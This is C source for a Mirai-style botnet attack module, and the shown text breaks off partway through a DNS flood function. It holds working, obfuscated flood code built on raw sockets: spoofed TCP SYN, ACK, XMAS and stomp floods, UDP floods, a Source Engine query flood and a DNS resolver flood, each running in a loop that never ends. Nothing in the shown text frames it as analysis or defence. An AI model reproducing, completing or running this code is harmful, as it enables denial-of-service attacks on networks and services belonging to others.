#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "protocol.h"

/* Stubs for Mirai table functions — we don't use the encrypted string table */
#define table_unlock_val(x) ((void)0)
#define table_lock_val(x) ((void)0)

/* VSE query payload: TSource Engine Query */
static char _kP4zM4s[] = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
static int _LG7Ei7w = 25;
#define TABLE_ATK_VSE 0
static char *_pt7BS3i(int id, int *out_len) { if (out_len) *out_len = _LG7Ei7w; return _kP4zM4s; }

/* DNS resolver path + nameserver label */
#define TABLE_ATK_RESOLVER 1
#define TABLE_ATK_NSERV 2
static ipv4_t _hU2VN8X(void);

/* ===== Helper functions ===== */

static int _ES7Jr7U(int protocol)
{
    int fd, one = 1;
    fd = socket(AF_INET, SOCK_RAW, protocol);
    if (fd == -1) return -1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) == -1)
    { close(fd); return -1; }
    return fd;
}

static void _mu3nA8m(struct iphdr *iph, uint8_t tos, uint16_t ident,
                         uint8_t ttl, BOOL dont_frag, uint8_t protocol,
                         uint32_t saddr, uint32_t daddr, uint16_t tot_len)
{
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = tos;
    iph->tot_len = htons(tot_len);
    iph->id = htons(ident);
    iph->ttl = ttl;
    if (dont_frag)
        iph->frag_off = htons(1 << 14);
    iph->protocol = protocol;
    iph->saddr = saddr;
    iph->daddr = daddr;
}

static void _PV8QK6Y(uint8_t *opts)
{
    *opts++ = PROTO_TCP_OPT_MSS;
    *opts++ = 4;
    *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
    opts += sizeof(uint16_t);
    *opts++ = PROTO_TCP_OPT_SACK;
    *opts++ = 2;
    *opts++ = PROTO_TCP_OPT_TSVAL;
    *opts++ = 10;
    *((uint32_t *)opts) = rand_next();
    opts += sizeof(uint32_t);
    *((uint32_t *)opts) = 0;
    opts += sizeof(uint32_t);
    *opts++ = 1;
    *opts++ = PROTO_TCP_OPT_WSS;
    *opts++ = 3;
    *opts++ = 6;
}

/* ===== TCP-with-options shared implementation (tcpsyn/ovh/tcpusyn/tcpall/tcpfrag/asyn) ===== */

static void NC5iv2R(uint8_t targs_len, struct _Lw2SW5p *targs,
    uint8_t opts_len, struct _ak3Jy6Y *opts,
    BOOL d_urg, BOOL d_ack, BOOL d_psh, BOOL d_rst, BOOL d_syn, BOOL d_fin,
    BOOL d_df, uint32_t d_ack_val)
{
    int i, fd;
    char **pkts;
    uint8_t ip_tos, ip_ttl;
    uint16_t ip_ident;
    BOOL dont_frag;
    port_t sport, dport;
    uint32_t seq, ack, source_ip;
    BOOL urg_fl, ack_fl, psh_fl, rst_fl, syn_fl, fin_fl;

    pkts = calloc(targs_len, sizeof(char *));
    if (!pkts) return;

    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, d_df);
    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    seq = Cn6pZ7t(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    ack = Cn6pZ7t(opts_len, opts, ATK_OPT_ACKRND, d_ack_val);
    urg_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_URG, d_urg);
    ack_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_ACK, d_ack);
    psh_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_PSH, d_psh);
    rst_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_RST, d_rst);
    syn_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_SYN, d_syn);
    fin_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_FIN, d_fin);
    source_ip = qM3bi3n(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    fd = _ES7Jr7U(IPPROTO_TCP);
    if (fd == -1) return;

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *tcp_opts;
        pkts[i] = calloc(128, sizeof(char));
        if (!pkts[i]) { close(fd); return; }
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        tcp_opts = (uint8_t *)(tcph + 1);
        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_TCP,
                     source_ip, targs[i].addr,
                     sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        _PV8QK6Y(tcp_opts);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}

void zH8AM3C(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    NC5iv2R(targs_len, targs, opts_len, opts,
        FALSE, FALSE, FALSE, FALSE, TRUE, FALSE, TRUE, 0);
}

void hF5fe6z(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    NC5iv2R(targs_len, targs, opts_len, opts,
        FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, TRUE, 0);
}

void EA6XQ6C(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    NC5iv2R(targs_len, targs, opts_len, opts,
        TRUE, FALSE, FALSE, FALSE, TRUE, FALSE, TRUE, 0);
}

void Hs2Ny8u(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    NC5iv2R(targs_len, targs, opts_len, opts,
        TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, 0);
}

void as6WA6q(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    NC5iv2R(targs_len, targs, opts_len, opts,
        TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, FALSE, 0);
}

void Db5Ym3u(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    NC5iv2R(targs_len, targs, opts_len, opts,
        FALSE, TRUE, FALSE, FALSE, TRUE, FALSE, TRUE, 0);
}

/* ===== stomp/xmas shared implementation ===== */

static void zy3Pc3K(uint8_t targs_len, struct _Lw2SW5p *targs,
    uint8_t opts_len, struct _ak3Jy6Y *opts,
    BOOL d_urg, BOOL d_ack, BOOL d_psh, BOOL d_rst, BOOL d_syn, BOOL d_fin,
    int d_data_len)
{
    int i, rfd;
    struct _jF5vX4i *conn_data;
    char **pkts;
    uint8_t ip_tos, ip_ttl;
    uint16_t ip_ident;
    BOOL dont_frag;
    port_t dport;
    BOOL urg_fl, ack_fl, psh_fl, rst_fl, syn_fl, fin_fl;
    int data_len;
    BOOL data_rand;

    conn_data = calloc(targs_len, sizeof(struct _jF5vX4i));
    pkts = calloc(targs_len, sizeof(char *));
    if (!conn_data || !pkts) return;

    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    urg_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_URG, d_urg);
    ack_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_ACK, d_ack);
    psh_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_PSH, d_psh);
    rst_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_RST, d_rst);
    syn_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_SYN, d_syn);
    fin_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_FIN, d_fin);
    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, d_data_len);
    data_rand = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    rfd = _ES7Jr7U(IPPROTO_TCP);
    if (rfd == -1) return;

    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;
        BOOL connected = FALSE;

        while (!connected)
        {
            if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
            {
                connected = TRUE;
                continue;
            }
            fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
            addr.sin_family = AF_INET;
            if (targs[i].netmask < 32)
                addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            else
                addr.sin_addr.s_addr = targs[i].addr;
            if (dport == 0xffff)
                addr.sin_port = rand_next() & 0xffff;
            else
                addr.sin_port = htons(dport);
            connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
            start_recv = time(NULL);
            while (TRUE)
            {
                int ret;
                recv_addr_len = sizeof(struct sockaddr_in);
                ret = recvfrom(rfd, pktbuf, sizeof(pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
                if (ret == -1)
                {
                    return;
                }
                if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (int)(sizeof(struct iphdr) + sizeof(struct tcphdr)))
                {
                    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));
                    if (tcph->source == addr.sin_port)
                    {
                        if (tcph->syn && tcph->ack)
                        {
                            struct iphdr *iph;
                            struct tcphdr *tcph2;
                            char *payload;
                            conn_data[i].addr = addr.sin_addr.s_addr;
                            conn_data[i].seq = ntohl(tcph->seq);
                            conn_data[i].ack_seq = ntohl(tcph->ack_seq);
                            conn_data[i].sport = tcph->dest;
                            conn_data[i].dport = addr.sin_port;
                            pkts[i] = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
                            if (!pkts[i]) { close(rfd); return; }
                            iph = (struct iphdr *)pkts[i];
                            tcph2 = (struct tcphdr *)(iph + 1);
                            payload = (char *)(tcph2 + 1);
                            _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_TCP,
                                         LOCAL_ADDR, conn_data[i].addr,
                                         sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
                            tcph2->source = conn_data[i].sport;
                            tcph2->dest = conn_data[i].dport;
                            tcph2->seq = conn_data[i].ack_seq;
                            tcph2->ack_seq = conn_data[i].seq;
                            tcph2->doff = 8;
                            tcph2->fin = TRUE;
                            tcph2->ack = TRUE;
                            tcph2->window = rand_next() & 0xffff;
                            tcph2->urg = urg_fl;
                            tcph2->ack = ack_fl;
                            tcph2->psh = psh_fl;
                            tcph2->rst = rst_fl;
                            tcph2->syn = syn_fl;
                            tcph2->fin = fin_fl;
                            rand_str(payload, data_len);
                            connected = TRUE;
                            break;
                        }
                        else if (tcph->fin || tcph->rst)
                        {
                            close(fd);
                            break; /* retry: re-enter while(!connected) */
                        }
                    }
                }
                if (time(NULL) - start_recv > 10)
                {
                    close(fd);
                    break; /* retry: re-enter while(!connected) */
                }
            }
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->seq = htons(conn_data[i].seq++);
            tcph->ack_seq = htons(conn_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}

void Jr5JL6d(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    zy3Pc3K(targs_len, targs, opts_len, opts,
        FALSE, TRUE, TRUE, FALSE, FALSE, FALSE, 768);
}

void Tn8aH6f(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    zy3Pc3K(targs_len, targs, opts_len, opts,
        TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, 768);
}

/* ===== UDP connected shared implementation (std/udpplain) ===== */

static void _AV8og7H(uint8_t targs_len, struct _Lw2SW5p *targs,
    uint8_t opts_len, struct _ak3Jy6Y *opts,
    int d_data_len, int sock_proto)
{
    int i;
    char **pkts;
    int *fds;
    port_t dport, sport;
    uint16_t data_len;
    BOOL data_rand;
    struct sockaddr_in bind_addr = {0};

    pkts = calloc(targs_len, sizeof(char *));
    fds = calloc(targs_len, sizeof(int));
    if (!pkts || !fds) return;

    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, d_data_len);
    data_rand = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        pkts[i] = calloc(65535, sizeof(char));
        if (!pkts[i]) return;
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, sock_proto)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in)) == -1)
        {
            /* ignored */
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1)
        {
            /* ignored */
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];
            if (data_rand)
                rand_str(data, data_len);
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}

void jG6oM6K(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    _AV8og7H(targs_len, targs, opts_len, opts, 1024, 0);
}

void bx3we8X(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    _AV8og7H(targs_len, targs, opts_len, opts, 512, IPPROTO_UDP);
}

/* ===== tcpack ===== */

void gj7Ru2o(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    int i, fd;
    char **pkts;
    uint8_t ip_tos, ip_ttl;
    uint16_t ip_ident;
    BOOL dont_frag;
    port_t sport, dport;
    uint32_t seq, ack, source_ip;
    BOOL urg_fl, ack_fl, psh_fl, rst_fl, syn_fl, fin_fl;
    int data_len;
    BOOL data_rand;

    pkts = calloc(targs_len, sizeof(char *));
    if (!pkts) return;

    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    seq = Cn6pZ7t(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    ack = Cn6pZ7t(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
    urg_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_URG, FALSE);
    ack_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_ACK, TRUE);
    psh_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_PSH, FALSE);
    rst_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_RST, FALSE);
    syn_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_SYN, FALSE);
    fin_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_FIN, FALSE);
    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    data_rand = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    source_ip = qM3bi3n(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    fd = _ES7Jr7U(IPPROTO_TCP);
    if (fd == -1) return;

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;
        pkts[i] = calloc(1510, sizeof(char));
        if (!pkts[i]) { close(fd); return; }
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);
        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_TCP,
                     source_ip, targs[i].addr,
                     sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 5;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        tcph->window = rand_next() & 0xffff;
        if (psh_fl)
            tcph->psh = TRUE;
        rand_str(payload, data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}

/* ===== udpgeneric ===== */

void Tv3eT5t(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    int i, fd;
    char **pkts;
    uint8_t ip_tos, ip_ttl;
    uint16_t ip_ident, data_len;
    BOOL dont_frag, data_rand;
    port_t sport, dport;
    uint32_t source_ip;

    pkts = calloc(targs_len, sizeof(char *));
    if (!pkts) return;

    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    data_rand = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    source_ip = Cn6pZ7t(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if (data_len > 1460)
        data_len = 1460;

    fd = _ES7Jr7U(IPPROTO_UDP);
    if (fd == -1) return;

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        pkts[i] = calloc(1510, sizeof(char));
        if (!pkts[i]) { close(fd); return; }
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_UDP,
                     source_ip, targs[i].addr,
                     sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + data_len);
            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}

/* ===== udpvse ===== */

void gb2ob7U(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    int i, fd;
    char **pkts;
    uint8_t ip_tos, ip_ttl;
    uint16_t ip_ident;
    BOOL dont_frag;
    port_t sport, dport;
    char *vse_payload;
    int vse_payload_len;

    pkts = calloc(targs_len, sizeof(char *));
    if (!pkts) return;

    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 27015);
    table_unlock_val(TABLE_ATK_VSE);
    vse_payload = _pt7BS3i(TABLE_ATK_VSE, &vse_payload_len);

    fd = _ES7Jr7U(IPPROTO_UDP);
    if (fd == -1) return;

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(128, sizeof(char));
        if (!pkts[i]) { close(fd); return; }
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);
        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_UDP,
                     LOCAL_ADDR, targs[i].addr,
                     sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + 4 + vse_payload_len);
        *((uint32_t *)data) = 0xffffffff;
        data += sizeof(uint32_t);
        util_memcpy(data, vse_payload, vse_payload_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}

/* ===== udpdns ===== */

void Fq5Mk7Y(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
{
    int i, fd;
    char **pkts;
    uint8_t ip_tos, ip_ttl, data_len;
    uint16_t ip_ident, dns_hdr_id;
    BOOL dont_frag;
    port_t sport, dport;
    char *domain;
    int domain_len;
    ipv4_t dns_resolver;

    pkts = calloc(targs_len, sizeof(char *));
    if (!pkts) return;

    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 53);
    dns_hdr_id = Cn6pZ7t(opts_len, opts, ATK_OPT_DNS_HDR_ID, 0xffff);
    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);
    domain = Gm8Th7P(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    dns_resolver = _hU2VN8X();

    if (domain == NULL)
    {
        return;
    }
    domain_len = util_strlen(domain);

    fd = _ES7Jr7U(IPPROTO_UDP);
    if (fd == -1) return;

    for (i = 0; i < targs_len; i++)
    {
        int ii;
        uint8_t curr_word_len = 0, num_words = 0;
        struct iphdr *iph;
        struct udphdr *udph;
        struct dnshdr *dnsh;
        char *qname, *curr_lbl;
        struct dns_question *dnst;
        pkts[i] = calloc(600, sizeof(char));
        if (!pkts[i]) { close(fd); return; }
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        dnsh = (struct dnshdr *)(udph + 1);
        qname = (char *)(dnsh + 1);
        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_UDP,
                     LOCAL_ADDR, dns_resolver,
                     sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question));
        udph->source = htons(sport);
